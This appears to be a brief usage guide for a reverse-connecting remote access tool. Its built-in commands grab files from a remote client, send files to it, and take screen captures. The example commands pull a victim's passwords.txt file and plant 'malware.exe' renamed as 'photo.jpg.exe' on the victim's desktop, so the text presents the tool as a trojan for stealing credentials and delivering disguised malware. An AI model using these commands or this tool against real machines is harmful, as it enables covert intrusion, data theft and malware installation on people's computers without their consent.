Launch server first, client attempts connecting periodically.
Interface is like your client's native shell with a few built-ins.

Retrieved files go to ~/GrabbedFiles or equivalent.
Yara searches start recursively from the client's working directory.

Custom command syntax:
grab <remote filepath>
send <local filepath> <remote filepath>
screencap
yara <local yara rules filepath>

Example commands:
grab C:\Users\John\Desktop\passwords.txt
send /home/user/Desktop/malware.exe C:\Users\John\Desktop\photo.jpg.exe
screencap
yara /home/user/yara.txt
